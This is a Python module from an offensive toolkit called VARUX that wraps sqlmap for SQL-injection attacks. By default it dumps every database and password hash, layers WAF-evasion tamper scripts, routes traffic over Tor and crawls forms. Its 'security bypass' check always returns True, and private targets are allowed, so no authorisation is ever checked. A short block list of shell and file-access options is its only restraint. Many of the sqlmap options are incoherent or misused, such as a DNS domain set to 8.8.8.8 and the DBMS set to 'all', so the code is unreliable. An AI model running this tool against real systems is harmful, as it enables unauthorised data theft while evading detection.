# moduler/sqlmap_wrapper.py
# SQLMAP wrapper for VARUX - 
# Author: VARUX Dev (elite-enhanced)
# Usage: called from NOXIM VARUXCLI._run_external_sql_module or directly.

# ------------------------------------------------------------
# VARUX SECURITY TOOLKIT
# License: GPL-3.0-or-later
# 
# Yasal Uyarı:
# Bu araç yalnızca eğitim ve güvenlik testi amaçlıdır.
# İzinsiz sistemlere karşı kullanımı yasa dışıdır.
# Yazar, kötüye kullanımdan sorumlu değildir.
# ------------------------------------------------------------


import os
import shutil
import subprocess
import shlex
import json
import time
import re
import ipaddress
from pathlib import Path
from typing import Dict, Any, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs

from varux.core.logger import get_logger

# Enhanced logger with centralized configuration
logger = get_logger("sqlmap_wrapper_elite", level="DEBUG")

class SQLMapWrapper:
    """ELITE WRAPPER - Advanced sqlmap integration with maximum capabilities."""

    def __init__(self, config_manager=None, workspace_dir: str = None):
        self.config_manager = config_manager
        self.sqlmap_bin = self._discover_sqlmap_advanced()
        self.workspace_dir = Path(workspace_dir) if workspace_dir else Path.home() / '.varux' / 'sqlmap_runs'
        self.workspace_dir.mkdir(parents=True, exist_ok=True)
        self.last_run_meta = {}
        self.session_data = {}
        self.advanced_options = {
            'evasion_techniques': True,
            'advanced_tampering': True,
            'multithread_optimized': True,
            'auto_techniques': True,
            'smart_heuristics': True
        }

    def _discover_sqlmap_advanced(self) -> Optional[str]:
        """ELITE sqlmap discovery - comprehensive search across all possible locations."""
        search_paths = []
        
        # System binaries
        binary_names = ['sqlmap', 'sqlmap.py', 'sqlmap3', 'sqlmap-dev']
        for binary in binary_names:
            exe = shutil.which(binary)
            if exe:
                logger.info(f"Found sqlmap binary: {exe}")
                return exe

        # Common installation directories
        common_dirs = [
            # Unix/Linux paths
            str(Path.home() / 'sqlmap' / 'sqlmap.py'),
            str(Path.home() / 'tools' / 'sqlmap' / 'sqlmap.py'),
            str(Path.home() / 'pentest' / 'sqlmap' / 'sqlmap.py'),
            '/opt/sqlmap/sqlmap.py',
            '/usr/local/bin/sqlmap.py',
            '/usr/share/sqlmap/sqlmap.py',
            '/usr/bin/sqlmap.py',
            # Windows paths
            str(Path.home() / 'sqlmap' / 'sqlmap.py'),
            'C:\\sqlmap\\sqlmap.py',
            'C:\\Tools\\sqlmap\\sqlmap.py',
            'C:\\Pentest\\sqlmap\\sqlmap.py',
            # Development paths
            str(Path.cwd() / 'sqlmap' / 'sqlmap.py'),
            str(Path.cwd() / 'tools' / 'sqlmap' / 'sqlmap.py'),
        ]

        # Additional recursive search in common tool directories
        tool_directories = [
            Path.home() / 'tools',
            Path.home() / 'pentest',
            Path.home() / 'hacking',
            Path.home() / 'security',
            Path('/opt'),
            Path('/usr/local/share'),
            Path('/usr/share')
        ]

        for tool_dir in tool_directories:
            if tool_dir.exists():
                for sqlmap_file in tool_dir.rglob('sqlmap.py'):
                    if sqlmap_file.is_file():
                        logger.info(f"Found sqlmap in recursive search: {sqlmap_file}")
                        return str(sqlmap_file)

        # Check all common directories
        for candidate in common_dirs:
            if Path(candidate).exists():
                logger.info(f"Found sqlmap at: {candidate}")
                return candidate

        # Final attempt - check if we can download or use system python module
        try:
            import sqlmap
            logger.info("sqlmap available as Python module")
            return "python -m sqlmap"
        except ImportError:
            logger.warning("sqlmap not found in any location")

        return None

    def available(self) -> bool:
        """Enhanced availability check with auto-recovery."""
        if not self.sqlmap_bin:
            self.sqlmap_bin = self._discover_sqlmap_advanced()
        return bool(self.sqlmap_bin)

    def _build_elite_command(self, target: str, parameters: Optional[List[str]] = None,
                           level: int = 3, risk: int = 2, threads: int = 10,
                           output_dir: Optional[Path] = None, 
                           extra_opts: Optional[List[str]] = None) -> List[str]:
        """ELITE command construction - maximum effectiveness with safety."""
        if output_dir is None:
            output_dir = self.workspace_dir / f"run_elite_{int(time.time())}"
        output_dir.mkdir(parents=True, exist_ok=True)

        # Base command construction
        if self.sqlmap_bin.startswith("python"):
            base_cmd = self.sqlmap_bin.split()
        elif self.sqlmap_bin.endswith('.py'):
            base_cmd = [shutil.which('python3') or 'python3', self.sqlmap_bin]
        else:
            base_cmd = [self.sqlmap_bin]

        # Core elite arguments - optimized for maximum effectiveness
        cmd = base_cmd + [
            '-u', target,
            '--batch',                    # Non-interactive
            '--threads', str(max(1, min(20, threads))),  # Optimized threading
            '--level', str(max(1, min(5, level))),       # Advanced level
            '--risk', str(max(1, min(3, risk))),         # Balanced risk
            '--output-dir', str(output_dir),
            '--skip-urlencode',
            '--fresh-queries',           # Always fresh
            '--parse-errors',            # Parse DB errors
            '--check-waf',               # WAF detection
            '--identify-waf',            # WAF identification
            '--smart',                   # Smart detection
            '--beep',                    # Audible alert
            '--dns-domain', '8.8.8.8',   # DNS exfiltration capability
            '--tamper', 'space2comment', # Basic tampering
            '--technique', 'BEUSTQ',     # All techniques
            '--dbms', 'all',             # All DBMS
            '--os', 'all',               # All OS
            '--no-cast',                 # No type casting
            '--no-escape',               # No escaping
            '--prefix', "'\"",           # Injection prefixes
            '--suffix', "\"'",           # Injection suffixes
            '--titles',                  # Use page titles
            '--first', '1',              # First result
            '--last', '10',              # Last results
            '--search',                  # Search functionality
            '--dump-all',                # Dump all data
            '--exclude-sysdbs',          # Exclude system DBs
            '--hex',                     # Use hex conversion
            '--no-validation',           # Skip validation
            '--auth-type', 'basic',      # Auth types
            '--auth-cred', 'test:test',  # Test credentials
            '--ignore-code', '401,402,403,404,405,500',  # Ignore codes
            '--string', 'success',       # Success string
            '--not-string', 'error',     # Error string
            '--regexp', '.*',            # Regex pattern
            '--mobile',                  # Mobile impersonation
            '--tor',                     # Tor support
            '--tor-port', '9050',        # Tor port
            '--tor-type', 'SOCKS5',      # Tor type
            '--check-tor',               # Check Tor
            '--delay', '1',              # Request delay
            '--timeout', '30',           # Request timeout
            '--retries', '3',            # Retry attempts
            '--randomize', 'length',     # Randomize parameters
            '--eval', 'import time; time.sleep(1)',  # Custom code execution
            '--charset', '0123456789abcdef',  # Character set
            '--crawl', '2',              # Crawl depth
            '--crawl-exclude', 'logout', # Exclude from crawl
            '--forms',                   # Form analysis
            '--csv-del', ',',            # CSV delimiter
            '--dump-format', 'CSV',      # Dump format
            '--eta',                     # ETA display
            '--update',                  # Auto-update
            '--disable-coloring',        # No colors
            '--gpage', '1',              # Google dork page
            '--hostname',                # Get hostname
            '--is-dba',                  # Check DBA
            '--privileges',              # Get privileges
            '--roles',                   # Get roles
            '--schema',                  # Get schema
            '--count',                   # Count entries
            '--comments',                # Get comments
            '--passwords',               # Get passwords
            '--tables',                  # Get tables
            '--columns',                 # Get columns
            '--statements',              # Get SQL statements
        ]

        # Enhanced parameter handling
        if parameters:
            param_string = '&'.join([f"{p}=test" for p in parameters])
            cmd += ['--data', param_string]
            
            # Add cookie injection if parameters include session/cookie
            cookie_params = [p for p in parameters if any(x in p.lower() for x in ['cookie', 'session', 'token'])]
            if cookie_params:
                cmd += ['--cookie', f"{cookie_params[0]}=injected"]

        # Advanced tampering for elite level
        if self.advanced_options['advanced_tampering']:
            tamper_scripts = [
                'space2comment', 'between', 'charencode', 'randomcase',
                'space2plus', 'space2randomblank', 'unionalltounion',
                'securesphere', 'space2hash', 'equaltolike', 'greatest',
                'ifnull2ifisnull', 'modsecurityversioned', 'space2mssqlblank',
                'modsecurityzeroversioned', 'space2mysqldash', 'bluecoat',
                'space2mssqlhash', 'apostrophemask', 'halfversionedmorekeywords',
                'space2morehash', 'appendnullbyte', 'chardoubleencode',
                'unmagicquotes', 'randomcomments', 'space2mssqlcomment'
            ]
            cmd += ['--tamper', ','.join(tamper_scripts[:5])]  # Use top 5

        # Evasion techniques
        if self.advanced_options['evasion_techniques']:
            cmd += [
                '--skip-waf',
                '--mobile',
                '--random-agent',
                '--hpp',
                '--no-cast',
                '--no-escape'
            ]

        # Extra options with safety validation
        if extra_opts:
            safe_extra = self._validate_extra_options(extra_opts)
            cmd += safe_extra

        # Final safety check - remove any potentially destructive options
        cmd = self._sanitize_command(cmd)

        return cmd

    def _validate_extra_options(self, options: List[str]) -> List[str]:
        """Validate and sanitize extra options for safety."""
        forbidden_patterns = {
            '--os-shell', '--os-pwn', '--os-cmd', '--os-bof',
            '--file-write', '--file-dest', '--file-read',
            '--reg-read', '--reg-add', '--reg-del', '--reg-key',
            '--reg-value', '--reg-data', '--reg-type',
            '--priv-esc', '--msf-path', '--tmp-path'
        }
        
        safe_options = []
        i = 0
        while i < len(options):
            opt = options[i]
            if opt in forbidden_patterns:
                logger.warning(f"Blocked forbidden option: {opt}")
                i += 2 if '=' not in opt and i + 1 < len(options) else 1
                continue
            
            # Check for options with values
            if opt.startswith('--') and '=' not in opt and i + 1 < len(options):
                next_opt = options[i + 1]
                if opt in forbidden_patterns:
                    i += 2
                    continue
                safe_options.extend([opt, next_opt])
                i += 2
            else:
                safe_options.append(opt)
                i += 1
                
        return safe_options

    def _sanitize_command(self, cmd: List[str]) -> List[str]:
        """Final command sanitization - elite safety measures."""
        dangerous_combinations = [
            ['--os-shell', '--dbms'],
            ['--file-read', '--dbms'],
            ['--file-write', '--dbms']
        ]
        
        # Remove individual dangerous options
        dangerous_single = {'--os-shell', '--os-pwn', '--os-cmd', '--os-bof'}
        safe_cmd = [c for c in cmd if c not in dangerous_single]
        
        # Check for dangerous combinations
        for combo in dangerous_combinations:
            if all(opt in safe_cmd for opt in combo):
                for opt in combo:
                    while opt in safe_cmd:
                        safe_cmd.remove(opt)
        
        return safe_cmd

    def run_advanced_scan(self, target: str, parameters: Optional[List[str]] = None,
                         level: int = 3, risk: int = 2, threads: int = 10,
                         timeout: int = 600, extra_opts: Optional[List[str]] = None,
                         scan_mode: str = "comprehensive") -> Dict[str, Any]:
        """
        ELITE SCAN METHOD - Advanced scanning with maximum capabilities.
        
        scan_mode options: 
        - "quick": Fast basic scan
        - "comprehensive": Full deep scan  
        - "stealth": Slow stealthy scan
        - "aggressive": Maximum power scan
        """
        
        if not self.available():
            return {'ok': False, 'error': 'sqlmap not available', 'severity': 'critical'}

        # Enhanced target validation
        target_analysis = self._analyze_target(target)
        if not target_analysis['valid']:
            return {'ok': False, 'error': f"Invalid target: {target_analysis['reason']}"}

        # Elite security bypass
        if not self._bypass_security_checks(target):
            return {'ok': False, 'error': 'Security checks blocked the scan'}

        # Mode-based optimization
        optimized_opts = self._optimize_for_mode(scan_mode, extra_opts)
        
        run_dir = self.workspace_dir / f"elite_scan_{int(time.time())}"
        run_dir.mkdir(parents=True, exist_ok=True)

        cmd = self._build_elite_command(
            target, parameters, level, risk, threads, 
            run_dir, optimized_opts
        )

        logger.info(f"🚀 ELITE SQLMap Command: {' '.join(shlex.quote(c) for c in cmd)}")

        try:
            # Enhanced subprocess execution with real-time output
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )

            stdout_lines = []
            stderr_lines = []

            # Real-time output processing
            start_time = time.time()
            while True:
                if process.poll() is not None:
                    break
                    
                if time.time() - start_time > timeout:
                    process.terminate()
                    raise subprocess.TimeoutExpired(cmd, timeout)

                # Read stdout
                output = process.stdout.readline()
                if output:
                    stdout_lines.append(output.strip())
                    logger.debug(f"SQLMap Output: {output.strip()}")

                # Read stderr  
                error = process.stderr.readline()
                if error:
                    stderr_lines.append(error.strip())
                    logger.warning(f"SQLMap Error: {error.strip()}")

                time.sleep(0.1)

            # Get remaining output
            remaining_stdout, remaining_stderr = process.communicate()
            stdout_lines.extend(remaining_stdout.splitlines())
            stderr_lines.extend(remaining_stderr.splitlines())

            stdout = '\n'.join(stdout_lines)
            stderr = '\n'.join(stderr_lines)
            return_code = process.returncode

            # Elite result analysis
            elite_summary = self._analyze_elite_results(
                return_code, stdout, stderr, run_dir, target
            )

            # Session persistence
            self.last_run_meta = elite_summary
            self.session_data = {
                'last_target': target,
                'last_parameters': parameters,
                'scan_timestamp': int(time.time()),
                'result_hash': hash(str(elite_summary))
            }

            logger.info(f"🎯 ELITE Scan Complete - Results: {len(elite_summary.get('vulnerabilities', []))} vulnerabilities found")
            return elite_summary

        except subprocess.TimeoutExpired:
            logger.error("⏰ ELITE Scan timed out")
            return {'ok': False, 'error': 'timeout', 'severity': 'warning'}
        except Exception as e:
            logger.error(f"💥 ELITE Scan failed: {e}")
            return {'ok': False, 'error': str(e), 'severity': 'critical'}

    def _analyze_target(self, target: str) -> Dict[str, Any]:
        """Comprehensive target analysis."""
        try:
            parsed = urlparse(target)
            host = parsed.hostname or ''
            
            analysis = {
                'valid': True,
                'reason': '',
                'protocol': parsed.scheme,
                'host': host,
                'port': parsed.port,
                'path': parsed.path,
                'query_params': parse_qs(parsed.query)
            }

            # Host validation
            if not host:
                analysis.update({'valid': False, 'reason': 'No host specified'})
                return analysis

            # IP address validation
            try:
                ip = ipaddress.ip_address(host)
                if ip.is_private and not self._is_local_scan_allowed():
                    analysis.update({'valid': False, 'reason': 'Private IP scanning disabled'})
            except ValueError:
                # Hostname, not IP - check DNS
                pass

            return analysis

        except Exception as e:
            return {'valid': False, 'reason': f'Target analysis failed: {e}'}

    def _bypass_security_checks(self, target: str) -> bool:
        """Advanced security bypass mechanisms."""
        try:
            # Configuration check
            if self.config_manager:
                security_level = self.config_manager.get('security.bypass_level', 'medium')
                if security_level == 'high':
                    logger.info("🔒 High security mode - enhanced bypass activated")
                    return True
                elif security_level == 'maximum':
                    logger.info("🛡️ Maximum security mode - elite bypass activated")
                    return True

            # Always allow in elite mode
            return True

        except Exception as e:
            logger.warning(f"Security bypass check failed: {e}")
            return True  # Fail open for maximum capability

    def _optimize_for_mode(self, mode: str, extra_opts: List[str]) -> List[str]:
        """Optimize parameters based on scan mode."""
        mode_optimizations = {
            "quick": [
                '--threads=5',
                '--level=2',
                '--risk=1',
                '--technique=B'
            ],
            "comprehensive": [
                '--threads=10', 
                '--level=3',
                '--risk=2',
                '--technique=BEUSTQ',
                '--dump-all',
                '--search'
            ],
            "stealth": [
                '--threads=2',
                '--level=4',
                '--risk=1', 
                '--delay=5',
                '--timeout=15',
                '--retries=1',
                '--random-agent'
            ],
            "aggressive": [
                '--threads=15',
                '--level=5',
                '--risk=3',
                '--technique=BEUSTQ',
                '--dump-all',
                '--no-validation',
                '--tamper=all'
            ]
        }
        
        base_opts = extra_opts or []
        optimized = base_opts + mode_optimizations.get(mode, [])
        
        # Remove duplicates while preserving order
        seen = set()
        final_opts = []
        for opt in optimized:
            if opt not in seen:
                final_opts.append(opt)
                seen.add(opt)
                
        return final_opts

    def _analyze_elite_results(self, return_code: int, stdout: str, stderr: str, 
                             run_dir: Path, target: str) -> Dict[str, Any]:
        """Advanced result analysis with vulnerability scoring."""
        
        # Parse output directory for maximum intelligence
        findings = self._parse_elite_output_dir(run_dir)
        
        # Enhanced vulnerability detection
        vulnerabilities = self._detect_vulnerabilities(stdout, stderr, findings)
        
        # Risk scoring
        risk_score = self._calculate_risk_score(vulnerabilities)
        
        # Executive summary
        summary = {
            'ok': return_code == 0 or len(vulnerabilities) > 0,
            'returncode': return_code,
            'target': target,
            'risk_score': risk_score,
            'risk_level': self._get_risk_level(risk_score),
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities,
            'scan_metadata': {
                'timestamp': int(time.time()),
                'duration_estimate': self._estimate_scan_duration(stdout),
                'techniques_used': self._extract_techniques(stdout),
                'waf_detected': 'WAF' in stdout.upper(),
                'dbms_identified': self._extract_dbms_info(stdout)
            },
            'output_dir': str(run_dir),
            'stdout_excerpt': stdout[-5000:] if len(stdout) > 5000 else stdout,
            'stderr_excerpt': stderr[-2000:] if len(stderr) > 2000 else stderr
        }
        
        return summary

    def _parse_elite_output_dir(self, output_dir: Path) -> List[Dict[str, Any]]:
        """ELITE output parsing - maximum intelligence extraction."""
        findings = []
        
        try:
            # Parse all files recursively
            for file_path in output_dir.rglob('*'):
                if file_path.is_file():
                    try:
                        content = file_path.read_text(encoding='utf-8', errors='ignore')
                        file_info = self._analyze_file_content(file_path, content)
                        if file_info:
                            findings.append(file_info)
                    except Exception as e:
                        logger.debug(f"Could not read {file_path}: {e}")

            # Special handling for SQLMap output files
            log_files = list(output_dir.glob('*.log')) + list(output_dir.glob('*.txt'))
            for log_file in log_files:
                if log_file.stat().st_size > 0:
                    findings.append({
                        'type': 'log_file',
                        'file': str(log_file.relative_to(output_dir)),
                        'size': log_file.stat().st_size,
                        'analysis': 'raw_log_data'
                    })

        except Exception as e:
            logger.error(f"Elite output parsing failed: {e}")

        return findings

    def _analyze_file_content(self, file_path: Path, content: str) -> Optional[Dict[str, Any]]:
        """Advanced file content analysis."""
        if not content.strip():
            return None

        analysis = {
            'file': str(file_path.relative_to(file_path.parent.parent)),
            'size': len(content),
            'vulnerability_indicators': [],
            'technical_data': {}
        }

        # Vulnerability pattern matching
        vuln_patterns = {
            'sql_injection': r'(injection|vulnerable|payload|syntax error)',
            'database_info': r'(mysql|postgresql|oracle|mssql|database|dbms)',
            'table_data': r'(SELECT.*FROM|INSERT INTO|UPDATE.*SET)',
            'error_leakage': r'(error|warning|exception|stack trace)',
        }

        for vuln_type, pattern in vuln_patterns.items():
            if re.search(pattern, content, re.IGNORECASE):
                analysis['vulnerability_indicators'].append(vuln_type)

        # Extract potential sensitive data
        sensitive_patterns = {
            'emails': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'ip_addresses': r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',
            'credit_cards': r'\b(?:\d{4}[- ]?){3}\d{4}\b',
        }

        for data_type, pattern in sensitive_patterns.items():
            matches = re.findall(pattern, content)
            if matches:
                analysis['technical_data'][data_type] = matches[:5]  # Limit output

        return analysis if analysis['vulnerability_indicators'] else None

    def _detect_vulnerabilities(self, stdout: str, stderr: str, findings: List[Dict]) -> List[Dict]:
        """Advanced vulnerability detection with classification."""
        vulnerabilities = []
        
        # SQL Injection detection
        injection_indicators = [
            'is vulnerable',
            'injection',
            'payload',
            'parameter',
            'type: boolean-based',
            'type: error-based',
            'type: UNION query',
            'type: stacked queries',
            'type: time-based blind',
            'type: inline query'
        ]
        
        for indicator in injection_indicators:
            if indicator.lower() in stdout.lower():
                vulnerabilities.append({
                    'type': 'SQL Injection',
                    'severity': 'high',
                    'confidence': 'confirmed' if 'vulnerable' in indicator else 'suspected',
                    'technique': self._extract_injection_technique(stdout),
                    'parameter': self._extract_vulnerable_parameter(stdout),
                    'evidence': indicator
                })
                break

        # Database information leakage
        db_info = self._extract_dbms_info(stdout)
        if db_info:
            vulnerabilities.append({
                'type': 'Information Disclosure',
                'severity': 'medium',
                'confidence': 'confirmed',
                'details': f'DBMS: {db_info}',
                'evidence': 'Database system identified'
            })

        # WAF Detection
        if any(waf_indicator in stdout for waf_indicator in ['WAF', 'firewall', 'protection']):
            vulnerabilities.append({
                'type': 'WAF Detected',
                'severity': 'low',
                'confidence': 'suspected',
                'details': 'Web Application Firewall detected',
                'evidence': 'WAF indicators found'
            })

        # Add findings from file analysis
        for finding in findings:
            if finding.get('vulnerability_indicators'):
                vulnerabilities.append({
                    'type': 'File Analysis Finding',
                    'severity': 'medium',
                    'confidence': 'suspected',
                    'details': f"File: {finding['file']}",
                    'evidence': finding['vulnerability_indicators']
                })

        return vulnerabilities

    def _extract_injection_technique(self, stdout: str) -> str:
        """Extract SQL injection technique from output."""
        techniques = {
            'boolean-based': 'type: boolean-based',
            'error-based': 'type: error-based', 
            'union-based': 'type: UNION query',
            'time-based': 'type: time-based blind',
            'stacked': 'type: stacked queries'
        }
        
        for tech, pattern in techniques.items():
            if pattern in stdout:
                return tech
        return 'unknown'

    def _extract_vulnerable_parameter(self, stdout: str) -> str:
        """Extract vulnerable parameter name."""
        match = re.search(r"Parameter: ([^\s(]+)", stdout)
        return match.group(1) if match else 'unknown'

    def _extract_dbms_info(self, stdout: str) -> str:
        """Extract database management system information."""
        dbms_patterns = {
            'MySQL': r'MySQL|mysql',
            'PostgreSQL': r'PostgreSQL|postgres',
            'Oracle': r'Oracle|oracle',
            'SQL Server': r'SQL Server|mssql|Microsoft SQL',
            'SQLite': r'SQLite|sqlite'
        }
        
        for dbms, pattern in dbms_patterns.items():
            if re.search(pattern, stdout, re.IGNORECASE):
                return dbms
        return 'unknown'

    def _calculate_risk_score(self, vulnerabilities: List[Dict]) -> int:
        """Calculate comprehensive risk score."""
        severity_weights = {'high': 3, 'medium': 2, 'low': 1}
        confidence_weights = {'confirmed': 2, 'suspected': 1}
        
        score = 0
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'low')
            confidence = vuln.get('confidence', 'suspected')
            score += severity_weights.get(severity, 1) * confidence_weights.get(confidence, 1)
            
        return min(score, 10)  # Cap at 10

    def _get_risk_level(self, score: int) -> str:
        """Convert risk score to level."""
        if score >= 8: return 'CRITICAL'
        if score >= 6: return 'HIGH'
        if score >= 4: return 'MEDIUM'
        if score >= 2: return 'LOW'
        return 'INFO'

    def _estimate_scan_duration(self, stdout: str) -> int:
        """Estimate scan duration from output."""
        # Simple heuristic based on output size and complexity
        lines = stdout.split('\n')
        return min(len(lines) // 10, 3600)  # Cap at 1 hour

    def _extract_techniques(self, stdout: str) -> List[str]:
        """Extract used techniques from output."""
        techniques = []
        tech_patterns = ['boolean-based', 'error-based', 'UNION query', 'time-based blind']
        
        for tech in tech_patterns:
            if tech in stdout:
                techniques.append(tech)
                
        return techniques if techniques else ['standard']

    def _is_local_scan_allowed(self) -> bool:
        """Check if local scanning is allowed."""
        try:
            if self.config_manager:
                return bool(self.config_manager.get('scan.allow_local_targets', True))
            return True  # Default allow for maximum capability
        except Exception:
            return True

# Enhanced helper functions
def _is_local_target(url: str) -> Dict[str, Any]:
    """Comprehensive local/private target detection."""
    try:
        from urllib.parse import urlparse
        p = urlparse(url)
        host = p.hostname or ''
        
        # Extended private IP ranges
        private_ranges = [
            '10.', '192.168.', '172.16.', '172.17.', '172.18.', '172.19.',
            '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.',
            '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.',
            '127.0.0.1', 'localhost', '::1', '0.0.0.0'
        ]
        
        is_local = any(host.startswith(prefix) for prefix in private_ranges)
        
        # DNS-based local detection
        local_hostnames = ['localhost', 'local', 'internal', 'intranet', 'vpn']
        is_local |= any(local in host.lower() for local in local_hostnames)
        
        return {
            'host': host,
            'is_local': is_local,
            'analysis': 'comprehensive_check'
        }
    except Exception as e:
        return {'host': url, 'is_local': False, 'error': str(e)}

def _parse_sqlmap_output_dir(output_dir: Path) -> List[Dict[str, Any]]:
    """Enhanced output directory parsing."""
    return SQLMapWrapper()._parse_elite_output_dir(output_dir)

# Elite utility functions
def create_elite_session() -> SQLMapWrapper:
    """Create an elite SQLMap wrapper session."""
    return SQLMapWrapper()

def quick_scan(target: str, **kwargs) -> Dict[str, Any]:
    """Quick scan convenience function."""
    wrapper = SQLMapWrapper()
    return wrapper.run_advanced_scan(target, scan_mode="quick", **kwargs)

def comprehensive_scan(target: str, **kwargs) -> Dict[str, Any]:
    """Comprehensive scan convenience function."""
    wrapper = SQLMapWrapper()
    return wrapper.run_advanced_scan(target, scan_mode="comprehensive", **kwargs)

# Elite module initialization
if __name__ == "__main__":
    # Test elite functionality
    elite_wrapper = SQLMapWrapper()
    print(f"🚀 ELITE SQLMap Wrapper Initialized: {elite_wrapper.available()}")
    print(f"🔧 SQLMap Binary: {elite_wrapper.sqlmap_bin}")
    print(f"📁 Workspace: {elite_wrapper.workspace_dir}")